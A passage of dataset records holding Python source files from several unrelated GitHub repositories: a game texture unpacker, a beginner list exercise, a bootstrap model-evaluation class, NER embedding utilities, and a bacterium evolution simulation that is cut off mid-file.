{"blob_id": "0507b0de1f875cd8543b126cebdd372fe64a5cfa", "directory_id": "26087ea3496b08743f27ebbdba2a4f9479078466", "path": "/scripts/sly2_tex.py", "content_id": "e3d42d4ea966c9d5f63070f15462f6fc650a20ce", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "VB6Hobbyst7/SlyTools", "snapshot_id": "e363427f1141094c5f48e83fb0fb66eed1ad8a87", "revision_id": "d451f5941437db87f6627b2426e45c6635bc94cc", "branch_name": "refs/heads/main", "visit_date": "2023-07-09 11:25:26.728993", "revision_date": "2021-07-19 06:56:48", "committer_date": "2021-07-19 06:57:08", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1094", "extension": "py", "content": "import sys\nimport struct\nfrom time import sleep\nfrom PIL import Image\nfrom pathlib import Path\n\nsys.path.append('../')\n\ndef unpack(_bytes):\n    STRUCT_SIGNS = {\n    1 : 'B',\n    2 : 'H',\n    4 : 'I',\n    8 : 'Q'\n    }\n    return struct.unpack('<' + STRUCT_SIGNS[len(_bytes)], _bytes)[0]\n\ntex_path = sys.argv[1]\n\nwith open(tex_path, 'rb') as file:\n    width = 128\n    height = 118\n\n    image = Image.new('P', (width, height))\n\n    p_start = 0\n    p_size = 0x280\n\n    palette_data = file.read(p_size - p_start)\n    palette = []\n    for i in range(0, len(palette_data), 4):\n        r = palette_data[i + 0]\n        g = palette_data[i + 1]\n        b = palette_data[i + 2]\n        palette.append(r)\n        palette.append(g)\n        palette.append(b)\n        print(\"i: {:02} (0x{:02X}) R: {:02X} G: {:02X} B: {:02X}\".format(i//4, i//4, r, g, b))\n\n        if len(palette) == 768:\n            break\n\n    image.putpalette(palette, rawmode='RGB')\n\n    file.seek(p_size)\n\n    data = file.read(width*height)\n    image = Image.frombytes('P', (width, height), data, 'raw', 'RGB')\n    image.save(\"test2.png\")\n"}
{"blob_id": "4819ba2edfafd5c50af6fec426ff7b0d8e7a6bbe", "directory_id": "3e1d448fc118aea7613074de661ca8baa42e1ad2", "path": "/listrev04.py", "content_id": "ef4180105c4c2d61265ad86872d508bd4ebf3267", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jonesant/Python-class-Feb2020", "snapshot_id": "d45e584c78d8964d1128a2e57b597b2cc84f4931", "revision_id": "ccb1d2125967837a0642b8e4fe18a0fe8f949de1", "branch_name": "refs/heads/master", "visit_date": "2020-12-27 19:58:42.585087", "revision_date": "2020-02-11 16:33:26", "committer_date": "2020-02-11 16:33:26", "github_id": "238033044", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "775", "extension": "py", "content": "#!/usr/bin/python3\n\ndef main():\n    ## create a list already containing IP addresses (strings)\n    iplist = ['10.0.0.1', '10.0.1.1', '10.3.2.1']\n\n    ## create a list of ports (strings)\n    iplist2 = ['5060', '80', '22']\n\n    ## display list\n    print(iplist)\n\n    ## Use the append method on iplist, our list object\n    ## append takes whatever it is passed and adds it to the list object (iplist)\n    ## this will create a list within a list\n    iplist.append(iplist2)\n\n    ## show how iplist has changed\n    print(iplist)\n\n    ## just like extend, append expects exactly one item to be passed.\n    ## If you'd like, uncomment the code below and see the error caused\n    # iplist.append('aa:bb:cc:dd:ee:ff', '00:11:22:33:44:55')\n\nif __name__ == \"__main__\":\n    main()     \n"}
{"blob_id": "4e1e9b24f40bbcf2fd13a1f15b3af0e59245f8ab", "directory_id": "455fbb2628a24ede2607e4e6f3d7a161bf0afcbc", "path": "/code/model_quality.py", "content_id": "e6db0c06c50b6fcc93dfa789ddb2d98a33b34dd4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "feathernox/mipt-brainsignals", "snapshot_id": "138f4984b1e30877e295690845428559dffe8bfd", "revision_id": "03e4c38dcaae8a917f348c6449d70308eb54d10e", "branch_name": "refs/heads/master", "visit_date": "2021-01-24 04:54:43.573444", "revision_date": "2018-05-20 16:40:54", "committer_date": "2018-05-20 16:40:54", "github_id": "122952266", "star_events_count": "0", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "2018-05-20 15:38:11", "gha_created_at": "2018-02-26 10:18:15", "gha_language": "Jupyter Notebook", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "14117", "extension": "py", "content": "\n# coding: utf-8\n\n# In[1]:\n\nfrom evaluate_info import *\n\nimport matplotlib.pyplot as plt\nget_ipython().magic('matplotlib inline')\n\ndef plot_graphics(names, ns_features, func, params=None):\n    rows = (len(names)+2) // 2\n    plt.figure(figsize=(20, 6 * rows))\n    for i in range(len(names)):\n        plt.subplot(rows, 2, i+1)\n        plt.scatter(ns_features, np.zeros_like(ns_features), label='used n', alpha=0.3, color='red')\n        name = names[i]\n        if params is None:\n            func(name)\n        else:\n            func(name, params)\n        plt.legend()\n        plt.title(name)\n        plt.xlabel('n')\n    plt.show()\n        \n\nclass ModelQuality():\n    '''\n    Computes the value and distribution of quality metrics for a pair (feature selection algorthm, model)\n    '''\n    \n    def __init__(self, selector, model):\n        '''\n        selector - feature selection algorithm. Selector class or similar\n        model - desired model\n        '''\n        \n        self.model = model\n        self.selector = selector\n\n    def fit(self, X, y, ns_features=None, test_size=0.3, X_test=None, y_test=None):\n        '''\n        Fits the object to the data\n        Parameters\n        ----------\n        X :           array-like, shape = [n_samples, n_features]\n                      Training vectors, where n_samples is the number of samples and\n                      n_features is the number of predictors.\n        y :           array-like, shape = [n_samples, n_targets]\n                      Target vectors, where n_samples is the number of samples and\n                      n_targets is the number of response variables.\n        ns_features : array-like, 1D. Each element is desired number of features to consider.\n                      Default is None.\n                      If None, all numbers from 1 to n_features will be considered.\n        test_size :   float\n                      size of test sample in case test data is generated using test_train_split. \n                      Default is 0.3.\n                      If X_test is not None, test_size is ignored\n        X_test :      array-like, shape = [n_samples, n_features] or None\n                      Test features, where n_samples is the number of samples and\n                      n_features is the number of predictors.\n                      Default is None.\n                      If None, test_train_split is used to generate test sample.\n        y_test :      array-like, shape = [n_samples, n_targets] or None\n                      Test target vectors, where n_samples is the number of samples and\n                      n_targets is the number of response variables.\n                      Default is None.\n                      If None, test_train_split is used to generate test sample.\n        '''\n\n        if X_test is None:\n            from sklearn.model_selection import train_test_split\n            self.X_train, self.X_test, self.y_train, self.y_test = train_test_split(X, y, test_size=test_size, random_state=179)\n        else:\n            self.X_train = X\n            self.y_train = y\n            self.X_test = X_test\n            self.y_test = y_test\n        \n        self.X_train = np.array(self.X_train)\n        self.y_train = np.array(self.y_train)\n        self.X_test = np.array(self.X_test)\n        self.y_test = np.array(self.y_test)\n        \n        \n        if ns_features is None:\n            self.ns_features = np.arange(self.X_train.shape[1]) + 1\n            #print(ns_features)\n        else:\n            self.ns_features = np.sort(np.array(ns_features))\n        #print(self.ns_features)\n        \n        #create masks for all ns_features using selection algorithm\n        self.masks = np.zeros((len(self.ns_features), self.X_train.shape[1]), dtype=np.bool)\n        self.selector.fit(self.X_train, self.y_train)\n        for (i, num) in enumerate(self.ns_features):\n            cur_features = self.selector.select(num)\n            self.masks[i][cur_features] = True \n            \n    def _calc_mean_and_std(self):\n        '''Calculates the mean and std of result'''\n        \n        self.mean = np.mean(self.result, axis=-1)\n        self.std = np.std(self.result, axis=-1)\n\n    def evaluate(self, metrics = [], comparisons = [], characteristics = [], n_samples=20, \n                 len_sample = None, mode='static', boot=None):\n        '''\n        Evaluates the metric values and bootstrap distributions.\n        \n        metrics :         array-like, element type = Metric or similar\n                          Desired metrics (see Metric)\n        comparisons :     array-like, element type = Comparison or similar\n                          Desired comparison (see Comparison)\n        characteristics : array-like, element type = Characteristic or similar\n                          Desired characteristics (see Characteristic)\n        \n        n_samples :       int\n                          Number of bootstrap samples to generate. Default is 20.\n        \n        len_sample :      int or None\n                          Length of each bootstrap sample\n                          If None, it will be equal to the number of features.\n        \n        mode :            string\n                          'static' or 'dynamic'. Default is 'static'\n                          The type of EvaluateInfo object. \n                          (See StaticEvaluateInfo/DynamicEvaluateInfo)\n        boot:             Bootstrap or None\n                          Desired bootstrap sample. If is not None, n_samples and len_sample are ignored.\n        \n        '''\n        \n        if mode == 'static':\n            self.evaluate_info = EvaluateStaticInfo(self.model, metrics, comparisons)\n        else:\n            self.evaluate_info = EvaluateDynamicInfo(self.model, metrics, comparisons, characteristics)\n        #print(self.evaluate_info)\n        self.n_samples = n_samples\n        self.len_sample = len_sample\n        self.evaluate_info.fit(self.X_train, self.y_train, self.X_test, self.y_test, self.masks, n_samples, len_sample, boot=boot)\n        self.result = self.evaluate_info.get_result()\n        self.quality = self.evaluate_info.get_quality()\n        self._calc_mean_and_std()\n    \n    def _draw_all(self, names, func):\n        '''Draws graphics for several metric names'''\n        \n        if names is None:\n            names = list(self.evaluate_info.names.keys())\n        plot_graphics(names, self.ns_features, func)\n        \n    def _get_index_by_name(self, name):\n        '''Returns the index corresponding to the name of a metric'''\n        return self.evaluate_info.names[name]\n        \n    def _draw_one(self, name):\n        '''\n        Draws values on test sample, mean value on bootstrap samples, std on boostrap samples and values on \n        bootstrap samples for metric with name \"name\"\n        '''\n        \n        index = self._get_index_by_name(name)\n        plt.plot(self.ns_features, self.quality[index], label='quality')\n        plt.plot(self.ns_features, self.mean[index], label='mean')\n        #plt.plot(self.ns_features, self.mean[index] + self.std[index], color='navy', label='mean+-std')\n        plt.fill_between(self.ns_features, self.mean[index] - self.std[index], self.mean[index] + self.std[index],\n                         alpha=0.2, label='std', color='blue')\n        for i in range(self.n_samples):\n            plt.plot(self.ns_features, self.result[index, :, i], color='purple', alpha=0.2)\n        plt.ylabel(name)\n        \n    def draw(self, names=None):\n        '''\n        Draws values on test sample, mean value on bootstrap samples, std on boostrap samples and values on \n        bootstrap samples for metrics with names in \"names\"\n        If names is None, graphics for all stored metrics will be drawn\n        '''\n        \n        self._draw_all(names, self._draw_one)\n    \n    def _draw_std_one(self, name):\n        '''\n        Draws values of std computed on bootstrap samples for metric with name \"name\"\n        '''\n        \n        index = self._get_index_by_name(name)\n        plt.plot(self.ns_features, self.std[index], color='navy')\n        plt.ylabel('std')\n    \n    def draw_std(self, names=None):\n        '''\n        Draws values of std computed on bootstrap samples for metrics with names in \"names\"\n        If names is None, graphics for all stored metrics will be drawn\n        '''\n        \n        self._draw_all(names, self._draw_std_one)\n    \n    def check_normality(self, pandas=False, criterion=None, alpha=0.05, return_original_p=False):\n        '''\n        Checks whether the distribution (computed with bootstrap) of values for all metrics for all numbers\n        of features is normal using multiple testing (see multipletest from statsmodels).\n        \n        Parameters:\n        pandas - whether to present the answer as pandas DataFrame. Boolean. Default is False.\n        \n        criterion - criterion to check normality. Function. If None, normaltest from scipy.stats will be used.\n        Default is None.\n        \n        alpha - importance level used in the criterion. Should be a parameter of criterion. Default is 0.05.\n        \n        return_original_p - whether to return original p_values (not only corrected)\n        \n        Return value:\n        (result, p, original_p) if return_original_p is True\n        (result, p) if return_original_p is False\n        \n        result - boolean 2D numpy array or pandas DataFrame. True in a cell means that the hypothesis is rejected,\n        False - that the hypothesis is not rejected.\n        \n        p - boolean 2D numpy array or pandas DataFrame consisting of corrected p_values.\n        \n        original_p - boolean 2D numpy array or pandas DataFrame consisting of original p_values.       \n        '''\n        \n        import scipy.stats as sps\n        from statsmodels.sandbox.stats.multicomp import multipletests\n        \n        if pandas:\n            import pandas as pd\n        if criterion is None:\n            criterion = sps.normaltest\n        p_val = np.zeros((len(self.result), self.result.shape[1]))\n        for index in range(len(self.result)):\n            for ni in range(self.result.shape[1]):\n                sample = self.result[index, ni, :]\n                p_val[index][ni] = criterion(sample)[1]\n        res = multipletests(p_val.ravel(), method='holm', alpha=alpha)\n        norm = (res[0]).reshape(p_val.shape).T\n        corrected_p = (res[1]).reshape(p_val.shape).T\n        p_val = p_val.T\n        if pandas:\n            norm = pd.DataFrame(norm, index=self.ns_features, columns=self.evaluate_info.names)\n            corrected_p = pd.DataFrame(corrected_p, index=self.ns_features, \n                                            columns=self.evaluate_info.names)\n            if return_original_p:\n                p_val = pd.DataFrame(p_val, index=self.ns_features, columns=self.evaluate_info.names)\n        if return_original_p:\n            return norm, corrected_p, p_val\n        else:\n            return norm, corrected_p\n    \n    def _kullback_leibler(self, a1, s1, a2, s2):\n        '''Computes the Kullback-Leibler divergence between two normal distributions'''\n        if s1 == 0 or s2 == 0:\n            print(\"Error: std=0\")\n            return 0\n        return np.log(s2/s1) + (s1**2 + (a1 - a2)**2) / (2 * s2**2) - 1/2\n    \n    def calculateKL(self, name):\n        index = self._get_index_by_name(name)\n        KL = np.zeros(len(self.ns_features))\n        for i in range(1, len(self.ns_features)):\n            diff = self._kullback_leibler(self.mean[index][i-1], self.std[index][i-1], \n                                          self.mean[index][i], self.std[index][i])\n            KL[i] = KL[i-1] + diff\n        return KL\n    \n    def _draw_KL_one(self, name):\n        '''\n        Draws sum for metric with name \"name\", where sum is an accumulated sum of KL divergence between the \n        distribution of values for n_features = i and distribution of values for n_features = i + 1 assuming that both\n        distributions are normal (parameters of the distribution are replaced by their estimates).\n        '''\n        KL = self.calcualteKL(name)\n        plt.plot(self.ns_features, KL, label='accumulated KL divergence')\n        plt.ylabel('KL')\n        \n    def draw_KL(self, names=None):\n        '''\n        Draws sum for metrics with names in \"names\", where sum is an accumulated sum of KL divergence between the \n        distribution of values for n_features = i and distribution of values for n_features = i + 1 assuming that both\n        distributions are normal (parameters of the distribution are replaced by their estimates).\n        '''\n        self._draw_all(names, self._draw_KL_one)\n        \n    def summary(self, names=None):\n        '''\n        Prints summary for names in \"names\"\n        '''\n        if names is None:\n            names = self.evaluate_info.names\n        for name in names:\n            index = self._get_index_by_name(name)\n            cur_quality = self.quality[index]\n            cur_mean = self.mean[index]\n            cur_std = self.std[index]\n            print(name, \":\")\n            print(\"Min metric test value:\", cur_quality.min(), \"with n =\", cur_quality.argmin())\n            print(\"Max metric test value:\", cur_quality.max(), \"with n =\", cur_quality.argmax())\n            print(\"Min metric average value\", cur_mean.min(), \"with n =\", cur_mean.argmin())\n            print(\"Max metric average value\", cur_mean.max(), \"with n =\", cur_mean.argmax())\n            print(\"Min metric std\", cur_std.min(), \"with n =\", cur_std.argmin())\n            print(\"Max metric std\", cur_std.max(), \"with n =\", cur_std.argmax())\n            print(\"Min metric mean-std\", (cur_mean-cur_std).min(), \"with n =\", (cur_mean-cur_std).argmin())\n            print(\"Max metric mean+std\", (cur_mean+cur_std).max(), \"with n =\", (cur_mean+cur_std).argmax())\n            print(\"Min metric relative std\", (cur_std/cur_mean).min(), \"with n =\", (cur_std/cur_mean).argmin())\n            print(\"Max metric relative std\", (cur_std/cur_mean).max(), \"with n =\", (cur_std/cur_mean).argmax())\n            print()\n            \n        \n        \n        \n            \n\n\n# In[ ]:\n\n\n\n"}
{"blob_id": "af103c4494ada0d5e06dfdf9edae0cd040701c0d", "directory_id": "306a4c4dbfbfdd9512ae149a1f0a5cdb139535f9", "path": "/utils/functions.py", "content_id": "756a9de4879b5b604c5c2c3c1938700914de3675", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "yx100/GAT-BiLSTM-CRF", "snapshot_id": "6b44441fdec2641e9b8f2ba634b6c101133aaf25", "revision_id": "252a3f95c56c24bf5d2cdb675c850c5d119b7b1b", "branch_name": "refs/heads/master", "visit_date": "2021-05-27 09:28:57.317424", "revision_date": "2020-11-18 06:04:35", "committer_date": "2020-11-18 06:04:35", "github_id": "254248672", "star_events_count": "5", "fork_events_count": "3", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7703", "extension": "py", "content": "import numpy as np\r\nfrom tqdm import tqdm\r\nfrom nltk.stem.lancaster import LancasterStemmer\r\n\r\n\r\ndef normalize_word(word):\r\n    new_word = \"\"\r\n    for char in word:\r\n        if char.isdigit():\r\n            new_word += '0'\r\n        else:\r\n            new_word += char\r\n    if word in ['one','two', 'three',\"I\",\"II\",\"III\",\"IV\",\"V\",\"VI\",\"I\",\"VII\",\"VIII\",\"IX\",\"XI\",\"XII\",\"XIII\",\"XIV\",\"XV\",\"I\",\"XVI\",\"XVII\",\"XVIII\",\"XIX\",\"Xiii\"]:\r\n        word = 0\r\n    return new_word\r\n\r\ndef read_instance(input_file, gaz, char_alphabet, label_alphabet, gaz_alphabet, number_normalized, max_sent_length):\r\n    in_lines = open(input_file, 'r').readlines()\r\n    instance_texts = []\r\n    instance_ids = []\r\n    chars = []\r\n    labels = []\r\n    char_ids = []\r\n    label_ids = []\r\n    cut_num = 0\r\n    mention_num = 0  #\u8bed\u6599\u4e2d\u5b9e\u4f53\u4e2a\u6570\r\n    for idx in range(len(in_lines)):\r\n        line = in_lines[idx]\r\n        if len(line) > 2:\r\n            pairs = line.strip().split()\r\n            char = pairs[0]\r\n            if number_normalized:\r\n                char = normalize_word(char)\r\n            label = pairs[-5]\r\n            if label != 'O':\r\n                label += \"-ENT\"\r\n            chars.append(char)#chars.append()\r\n            labels.append(label)\r\n            char_ids.append(char_alphabet.get_index(char))\r\n            label_ids.append(label_alphabet.get_index(label))\r\n        else:\r\n            if ((max_sent_length < 0) or (len(chars) < max_sent_length)) and (len(chars) > 0):\r\n                gazs = []\r\n                gaz_ids = []\r\n                s_length = len(chars)\r\n                gaz_num = 0\r\n                for idx in range(s_length):\r\n                    matched_list = gaz.enumerateMatchList(chars[idx:])\r\n                    matched_length = [len(a.split()) for a in matched_list]\r\n                    gazs.append(matched_list)\r\n                    matched_id = [gaz_alphabet.get_index(entity) for entity in matched_list]\r\n                    if matched_id:\r\n                        gaz_ids.append([matched_id, matched_length])\r\n                        mention_num += len(matched_id)\r\n                        gaz_num += 1\r\n                    else:\r\n                        gaz_ids.append([])\r\n\r\n                instance_texts.append([chars, gazs, labels])\r\n\r\n\r\n                if (gaz_num > 2 and len(chars) < 15):\r\n                    print(\" \".join(chars))\r\n                    print(\"#\".join(\"|\".join(gaz) for gaz in gazs))\r\n                    print(\" \".join(labels) + \"\\n\")\r\n                instance_ids.append([char_ids, gaz_ids, label_ids])\r\n\r\n            elif len(chars) < max_sent_length:\r\n                cut_num += 1\r\n            chars = []\r\n            labels = []\r\n            char_ids = []\r\n            label_ids = []\r\n            gazs = []\r\n            gaz_ids = []\r\n    if ((max_sent_length < 0) or (len(chars) < max_sent_length)) and (len(chars) > 0):\r\n        gazs = []\r\n        gaz_ids = []\r\n        s_length = len(chars)\r\n        gaz_num = 0\r\n        for idx in range(s_length):\r\n            matched_list = gaz.enumerateMatchList(chars[idx:])\r\n            matched_length = [len(a.split()) for a in matched_list]\r\n            gazs.append(matched_list)\r\n            matched_id = [gaz_alphabet.get_index(entity) for entity in matched_list]\r\n            if matched_id:\r\n                gaz_ids.append([matched_id, matched_length])\r\n                mention_num += len(matched_id)\r\n                gaz_num += 1\r\n            else:\r\n                gaz_ids.append([])\r\n\r\n        instance_texts.append([chars, gazs, labels])\r\n\r\n        if (gaz_num > 2 and len(chars) < 15):\r\n            print(\" \".join(chars))\r\n            print(\"#\".join(\"|\".join(gaz) for gaz in gazs))\r\n            print(\" \".join(labels) + \"\\n\")\r\n        instance_ids.append([char_ids, gaz_ids, label_ids])\r\n\r\n    return instance_texts, instance_ids, cut_num,mention_num\r\n\r\n\r\ndef build_pretrain_embedding(embedding_path, alphabet, skip_first_row=False, separator=\" \", embedd_dim=100, norm=True,isdic=False):\r\n    embedd_dict = dict()\r\n    if embedding_path != None:\r\n        if isdic == True:\r\n            embedd_dict, embedd_dim = load_pretrain_dic_emb(embedding_path, skip_first_row, separator)\r\n        else:\r\n            embedd_dict, embedd_dim = load_pretrain_emb(embedding_path, skip_first_row, separator)\r\n    scale = np.sqrt(3.0 / embedd_dim)\r\n    pretrain_emb = np.empty([alphabet.size(), embedd_dim])\r\n    perfect_match = 0\r\n    case_match = 0\r\n    not_match = 0\r\n    for alph, index in alphabet.iteritems():\r\n        if alph in embedd_dict:\r\n            if norm:\r\n                pretrain_emb[index, :] = norm2one(embedd_dict[alph])\r\n            else:\r\n                pretrain_emb[index, :] = embedd_dict[alph]\r\n            perfect_match += 1\r\n        elif alph.lower() in embedd_dict:\r\n            if norm:\r\n                pretrain_emb[index, :] = norm2one(embedd_dict[alph.lower()])\r\n            else:\r\n                pretrain_emb[index, :] = embedd_dict[alph.lower()]\r\n            case_match += 1\r\n        else:\r\n            pretrain_emb[index, :] = np.random.uniform(-scale, scale, [1, embedd_dim])\r\n            not_match += 1\r\n    pretrained_size = len(embedd_dict)\r\n    print(\"Embedding: %s\\n     pretrain num:%s, prefect match:%s, case_match:%s, oov:%s, oov%%:%s\" % (\r\n    embedding_path, pretrained_size, perfect_match, case_match, not_match, (not_match + 0.) / alphabet.size()))\r\n    return pretrain_emb, embedd_dim\r\n\r\n\r\ndef norm2one(vec):\r\n    root_sum_square = np.sqrt(np.sum(np.square(vec)))\r\n    return vec / root_sum_square\r\n\r\n\r\ndef load_pretrain_emb(embedding_path, skip_first_row=False, separator=\" \"):\r\n    embedd_dim = -1\r\n    embedd_dict = dict()\r\n    with open(embedding_path, 'r') as file:\r\n        i = 0\r\n        j = 0\r\n        for line in file:\r\n            if i == 0:\r\n                i = i + 1\r\n                if skip_first_row:\r\n                    _ = line.strip()\r\n                    continue\r\n            j = j+1\r\n            line = line.strip()\r\n            if len(line) == 0:\r\n                continue\r\n            tokens = line.split(separator)\r\n            if embedd_dim < 0:\r\n                embedd_dim = len(tokens) - 1\r\n            else:\r\n                if embedd_dim + 1 == len(tokens):\r\n                    embedd = np.empty([1, embedd_dim])\r\n                    embedd[:] = tokens[1:]\r\n                    embedd_dict[tokens[0]] = embedd\r\n                else:\r\n                    continue\r\n    return embedd_dict, embedd_dim\r\n\r\n\r\ndef load_pretrain_dic_emb(embedding_path, skip_first_row=False, separator=\" \"):\r\n    embedd_dim = -1\r\n    embedd_dict = dict()\r\n    with open(embedding_path, 'r') as file:\r\n        i = 0\r\n        j = 0\r\n        for line in file:\r\n            if i == 0:\r\n                i = i + 1\r\n                if skip_first_row:\r\n                    _ = line.strip()\r\n                    continue\r\n            j = j+1\r\n            line = line.strip()\r\n            if len(line) == 0:\r\n                continue\r\n            tokens = line.split(\"\\t\")\r\n            if len(tokens)>1:\r\n                token = tokens[0]\r\n                items = tokens[1].split()\r\n                if embedd_dim < 0:\r\n                    embedd_dim = len(items)\r\n                embedd = np.empty([1, embedd_dim])\r\n                embedd[:] = items[:]\r\n                embedd_dict[token] = embedd\r\n    return embedd_dict, embedd_dim\r\n\r\ndef  exacter_stems_of_word(word):\r\n    #input: word list []\r\n    #output: stem list []\r\n    lancaster_stemmer = LancasterStemmer()\r\n    #words_stemmer = [lancaster_stemmer.stem(token_word) for token_word in wordlist]\r\n    word = normalize_word(word)\r\n    word_stemmer = lancaster_stemmer.stem(word)\r\n    return word_stemmer\r\n\r\n"}
{"blob_id": "7341fc5251205dfabfedd71a9b17b26a6dd465dc", "directory_id": "a43c0af2784f862e7b1a3714084194051ab890cd", "path": "/life_classes.py", "content_id": "deef219169792afb19d04eeb82ca78600112e7b6", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "misterioni/bacterium_evolution", "snapshot_id": "f9b06701c7b11b9371ba93308692147d3087e975", "revision_id": "ea498a9817872a7b28a50a0da6f858c35bfdbcaa", "branch_name": "refs/heads/main", "visit_date": "2023-03-16 05:18:56.628370", "revision_date": "2021-03-06 16:30:59", "committer_date": "2021-03-06 16:30:59", "github_id": "342546921", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "9323", "extension": "py", "content": "import numpy as np\nimport cv2\nimport tqdm\nfrom collections import defaultdict\nimport itertools\nimport random\nimport pandas as pd\nfrom parametrs import *\n\nclass Cell():\n    \n    def __init__(self,time,genome = ''):\n        genes_list = np.array(['Up', 'Down', 'Left', 'Right', 'Foto', 'Chemo', 'Eat'])\n        if len(genome) == 0:\n            genome = np.array([random.choice(genes_list) for _ in np.arange(len_genome)])\n        unique, counts = np.unique(genome,return_counts = True)\n        gene_count = defaultdict(int,zip(unique,counts))\n        \n        color = np.array([\n            (gene_count['Eat']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0,\n            (gene_count['Foto']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0,\n            (gene_count['Chemo']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0\n        ])\n        if sum(color) == 0:\n            color = np.array([255,255,255])\n        \n        self.screen_size = np.array(screen_size)\n        \n        self.age = 0\n        self.organic = start_organic\n        \n        self.gene_count = gene_count\n        self.color = np.around(color)\n        self.genome = genome\n        self.genes_list = genes_list\n        \n        self.idx = None\n        self.x = None\n        self.y = None\n        \n        self.time_create = time\n        self.mother = -1\n        \n    def mutation(self, p_type_mutation = [0.95,0.03,0.01,0.01]):\n        type_mutation = np.random.choice(['Not_Mutation','SNP','Insertion','Deletion'], p = p_type_mutation)\n        if type_mutation == 'Not_Mutation':\n            pass\n        elif type_mutation == 'SNP':\n            self.genome[random.randint(0,len(self.genome))-1] = np.random.choice(self.genes_list)\n        elif type_mutation == 'Insertion':\n            insertion = [random.randint(0,len(self.genome)-1) for _ in range(2)]\n            self.genome = np.append(self.genome,self.genome[min(insertion):max(insertion)])\n        elif type_mutation == 'Deletion':\n            deletion = [random.randint(0,len(self.genome)-1) for _ in range(2)]\n            self.genome = np.delete(self.genome,np.arange(min(deletion) , max(deletion)))\n        \n        unique, counts = np.unique(self.genome,return_counts = True)\n        gene_count = defaultdict(int,zip(unique,counts))\n        self.gene_count = gene_count    \n        self.color = np.array([\n            (gene_count['Eat']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0,\n            (gene_count['Foto']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0,\n            (gene_count['Chemo']*255)/(sum([gene_count['Eat'],gene_count['Foto'],gene_count['Chemo']])) if gene_count['Eat'] !=0 else 0\n        ])\n        if sum(self.color) == 0:\n            self.color = np.array([255,255,255])\n        self.color = np.around(self.color)\n        \n    def action(self,population,population_map,medium,life_cell,dead_list, time):\n        self.age += 1\n        if self.idx not in dead_list:\n            if self.organic <= dead_level or self.age > dead_age:\n                life_cell[self.idx] = False\n                population_map[self.y,self.x] = empty\n                dead_list.add(self.idx)\n            elif self.organic < life_level:\n\n                gene = random.choice(self.genome)\n\n                if gene == 'Right':\n                    if self.x < self.screen_size[1] - 1:\n                        if population_map[self.y, self.x + 1] == empty:\n                            population_map[self.y,self.x], population_map[self.y, self.x+1] = population_map[self.y, self.x+1],population_map[self.y, self.x]\n                            self.x += 1\n                            self.organic -= move_score\n\n                elif gene == 'Left':\n                    if self.x > 0:\n                        if population_map[self.y, self.x - 1] == empty:\n                            population_map[self.y,self.x], population_map[self.y, self.x-1] = population_map[self.y, self.x-1],population_map[self.y, self.x]\n                            self.x -= 1\n                            self.organic -= move_score\n\n                elif gene == 'Up':\n                    if self.y > 0:\n                        if population_map[self.y - 1, self.x] == empty:\n                            population_map[self.y,self.x] , population_map[self.y - 1, self.x] = population_map[self.y-1,self.x] , population_map[self.y, self.x]\n                            self.y -= 1\n                            self.organic -= move_score\n\n                elif gene == 'Down':\n                    if self.y < self.screen_size[0] - 1:\n                        if population_map[self.y + 1, self.x] == empty:\n                            population_map[self.y,self.x] , population_map[self.y + 1, self.x] = population_map[self.y+1,self.x] , population_map[self.y, self.x]\n                            self.y += 1\n                            self.organic -= move_score\n\n\n                elif gene == 'Eat':\n\n                    neighbors = population_map[max(0,self.y - 1):min(screen_size[0] - 1, self.y + 2),\n                                       max(0,self.x - 1):min(screen_size[0] - 1, self.x + 2)]\n\n                    kill_list = list(neighbors[(neighbors != empty) & (neighbors != self.idx)])\n                    if len(kill_list) != 0:\n                        random.shuffle(kill_list)\n\n                        for kill_id in kill_list:\n                            if kill_id not in dead_list:\n\n                                self.organic += organic_eat * population[kill_id].organic\n\n                                life_cell[kill_id] = False\n                                population_map[self.y,self.x] = empty\n                                self.y = population[kill_id].y\n                                self.x = population[kill_id].x\n\n                                population_map[self.y,self.x] = self.idx\n\n                                dead_list.add(kill_id)\n                                break\n\n\n                elif gene == 'Foto':\n                    self.organic += medium[self.y,self.x,1]/100 * organic_foto\n                elif gene == 'Chemo':\n                    self.organic += medium[self.y,self.x,2]/100 * organic_salt \n\n            elif self.organic >= life_level:\n\n                neighbors = population_map[max(0,self.y - 1):min(screen_size[0] - 1, self.y + 2),\n                                           max(0,self.x - 1):min(screen_size[0] - 1, self.x + 2)]\n                if len(neighbors[neighbors != empty ]) < 9:\n                    new_cell = Cell(genome = self.genome, time = time)\n                    new_cell.mutation(p_type_mutation = p_mutation)\n                    new_cell.organic = self.organic/2\n                    new_cell.idx = population.last_valid_index() + 1\n                    new_cell.mother = self.idx\n                    self.organic = self.organic/2\n                    coord = list(itertools.product(range(max(0,self.y - 1),min(screen_size[0] - 1, self.y + 2)),\n                                                   range(max(0,self.x - 1),min(screen_size[0] - 1, self.x + 2))))\n                    random.shuffle(coord)\n                    for i,j in coord:\n                        if (population_map[i,j] == empty) and 